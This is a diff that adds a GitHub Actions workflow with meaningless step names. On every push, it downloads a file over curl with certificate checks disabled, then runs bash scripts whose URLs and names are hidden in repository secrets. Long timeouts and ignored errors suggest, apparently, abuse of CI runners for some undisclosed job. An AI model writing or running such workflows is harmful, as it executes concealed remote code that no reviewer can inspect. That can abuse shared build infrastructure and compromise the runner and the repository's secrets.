@@ -1,0 +1,29 @@
+name: genarator1
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: in1
+       uses: actions/checkout@main
+
+     - name: in2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+     - name: in3
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EA_EF }}
+     - name: in4
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EA_GH }}
